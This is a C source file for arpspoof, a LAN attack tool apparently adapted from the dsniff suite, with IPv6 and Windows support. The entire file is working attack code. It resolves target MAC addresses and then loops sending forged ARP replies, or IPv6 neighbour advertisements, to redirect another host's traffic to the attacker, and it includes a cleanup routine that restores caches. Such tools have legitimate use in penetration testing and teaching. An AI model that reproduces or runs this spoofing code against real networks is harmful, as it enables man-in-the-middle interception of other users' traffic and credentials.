/*
 *  $Id: arpspoof.c,v 1.1.1.1 2005/03/06 00:39:03 weiming_lai Exp $
 * 
 *  arpspoof.c - Redirect packets from a target host (or from all hosts) 
 *               intended for another host on the LAN to ourselves.
 *               support IPv4 & IPv6, platform independent 
 *
 *  Copyright (c) 2005 weiming lai <weiminglai@hotmail.com>
 *  Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */
//Modified by Robbie Clemons <robclemons@gmail.com> 5/23/2011

#include "arpspoof.h"
#include "libnet_helper.h"
#include "ensure_death.h"//added by Robbie Clemons
#ifdef _WIN32
#include "../libnet/include/win32/getopt.h"
#endif

#if defined(__WIN32__)
//#include <winsock2.h>
//#include <ws2tcpip.h>
#ifndef _WIN32
//#include <sys/time.h>
#endif
#include <iphlpapi.h>
#endif  /* __WIN32__ */

static u_char ether_addr[6];
static u_char spoof_mac[6];
static u_char target_mac[6];
static in_addr_t spoof_ip, target_ip;

#ifdef _support_IPv6_
static in6_addr_t spoof_ip6, target_ip6;
static int ipver=4;
#endif

void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-v 6/4 ] [-i interface] [-t target] host\n");
	exit(1);
}

#ifdef __linux__
int
arp_force(in_addr_t dst)
{
        struct sockaddr_in sin;
        int i, fd;
                                                                                          
        if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
                return (0);
                                                                                          
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = dst;
        sin.sin_port = htons(67);
                                                                                          
        i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
                                                                                          
        close(fd);
                                                                                          
        return (i == 0);
}
#endif

int
arp_find(libnet_t *l, in_addr_t ip, u_char *mac)
{
	int i = 0;

#if !(__WIN32__)
	do {
		if (arp_cache_lookup(ip, mac) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip);		
#endif
		sleep(1);
	}
	while (i++ < 3);

	return (0);
#else
	u_int32_t pulMac[2];
	u_int32_t ulLen=6;

	if(NO_ERROR == SendARP(ip, 0, (PULONG)pulMac, (PULONG)&ulLen))
	{
		memcpy(mac, (u_char *)pulMac, ulLen);
		return 1;
	}
	else
	{
		fprintf(stderr, "failed to get dest mac\n");
		return 0;
	}
#endif
	return (0);
}

int
arp_send(libnet_t *l, int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)
{	
	libnet_ptag_t t;	
	
	if (sha == NULL &&
	    (sha = (u_char *)libnet_get_hwaddr(l)) == NULL) {
		return (-1);
	}
	if (spa == 0) {
		if ((spa = libnet_get_ipaddr4(l)) == -1)
			return (-1);		
	}
	if (tha == NULL)
		tha = (u_char *)"\xff\xff\xff\xff\xff\xff";
        
    libnet_clear_packet(l);

	/*
     *  Build the packet, remmebering that order IS important.  We must
     *  build the packet from lowest protocol type on up as it would
     *  appear on the wire.  So for our ARP packet:
     *
     *  -------------------------------------------
     *  |  Ethernet   |           ARP             |
     *  -------------------------------------------
     *         ^                     ^
     *         |------------------   |
     *  libnet_build_ethernet()--|   |
     *                               |
     *  libnet_build_arp()-----------|
     */

	t = libnet_build_arp(
            ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            6,                                      /* hardware addr size */
            4,                                      /* protocol addr size */
            op,                                     /* operation type */
            sha,                                    /* sender hardware addr */
            (u_int8_t *)&spa,                       /* sender protocol addr */
            tha,                                    /* target hardware addr */
            (u_int8_t *)&tpa,                       /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            l,                                      /* libnet context */
            0);                                     /* libnet id */

	if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return -1;
    }

	t = libnet_autobuild_ethernet(
            tha,                                    /* ethernet destination */
            ETHERTYPE_ARP,                          /* protocol type */
            l);                                     /* libnet handle */

    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return -1;
    }    
    return libnet_write(l);    		
}

#if !(__WIN32__)
void
cleanup(int sig)
{
	int i;
	libnet_t* l = getLinkInstance(0);
	
    if (! l)
             exit(0);
#ifdef _support_IPv6_
    if (ipver == 6) {
		if (ipv6_find_mac(spoof_ip6, spoof_mac)) {		
			for (i = 0; i < 3; i ++) {
				ndar_send(l,
		                 NDOP_ADVERTISE,
			             spoof_mac, spoof_ip6, 
						 target_mac, target_ip6);
			    sleep(1);
			}
		}	    
	}
	else
#else
	if (arp_find(l, spoof_ip, spoof_mac)) {
		for (i = 0; i < 3; i++) {			
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			arp_send(l, ARPOP_REPLY, spoof_mac, spoof_ip,
				 (target_ip ? target_mac : NULL),
				 target_ip);                        
			sleep(1);
		}
	}
#endif
	libnet_destroy(l);
	exit(0);
}
#endif

int
main(int argc, char *argv[])
{    
    libnet_t *l = NULL;
    char     *device = NULL;    
    //char      errbuf[LIBNET_ERRBUF_SIZE];
	//char     ifname[IF_NAME_SIZE];
	int      c;	

	while ((c = getopt(argc, argv, "v:i:t:h?")) != -1) {
		switch (c) {
#ifdef _support_IPv6_
		case 'v':
			 ipver = atoi(optarg);
			 if (ipver != 6 && ipver != 4 )
				 usage();
			 break;
#endif
		case 'i':
			l = createLinkInstance(optarg);
			if (!l)
			{
				 fprintf(stderr, "could not create Libnet instance\n");
				 exit(0);
			}			
			break;
		case 't':
			 l = getLinkInstance(1);
			 if (!l)
			 {
				 fprintf(stderr, "could not create Libnet instance\n");
				 exit(EXIT_FAILURE);
			 }
#ifdef _support_IPv6_
	         if (ipver == 6)
			 {
		         if (ipv6_name_resolve(optarg, &target_ip6) == -1)
			        usage();
			 }
	         else
#endif			
			if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
				usage();
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();
	l = getLinkInstance(1);
	/*ensure_death added By Robbie Clemons to cause this application to exit if the calling application is killed*/
	ensure_death();
	if (!l)
	{
		fprintf(stderr, "could not create Libnet instance\n");
		exit(0);
	}
#ifdef _support_IPv6_
	if (ipver == 6)
	{
		if (ipv6_name_resolve(argv[0], &spoof_ip6) == -1)
		{
			fprintf(stderr, "incorrect IPv6 address format\n");
			exit(-1);
		}
	}
	else
#endif	  	
	if ((spoof_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
	    	usage();	
			
#ifdef _support_IPv6_
	if (ipver == 6)
	{
		if (ipv6_find_mac(target_ip6, target_mac) <= 0)
		{
			fprintf(stderr,"couldn't mac address for target host\n");		     
			exit(-1);			
		}
	}
	else
#endif
	if (target_ip != 0 && !arp_find(l, target_ip, target_mac))
	{
		fprintf(stderr, "couldn't arp for host %s\n", 
			libnet_addr2name4(target_ip, LIBNET_RESOLVE));
		goto bad;
	}
	//gLibnetPtr = l;
#if !(__WIN32__)
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
#endif
	
	for (;;) {		
#ifdef _support_IPv6_
	   if (ipver == 6)
		 c = ndar_send(l,
		               NDOP_ADVERTISE, /* NDOP_SOLICATION,*/ 		    
			           NULL, spoof_ip6, target_mac, target_ip6);
	   else
#endif
	 	 c =  arp_send(l, ARPOP_REPLY, NULL, spoof_ip,
			         (target_ip ? target_mac : NULL),
			         target_ip);
	   if (c <= 0)
	   {
		   fprintf(stderr, "failed to write(%s)\n", libnet_geterror(l));
		   goto bad;
	   }
	   else
		   fprintf(stderr, "packet size %d\n", c);
#if !(__WIN32__)
            sleep(1);
#else
            Sleep(1000);
#endif			
	}	
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}
/* EOF */
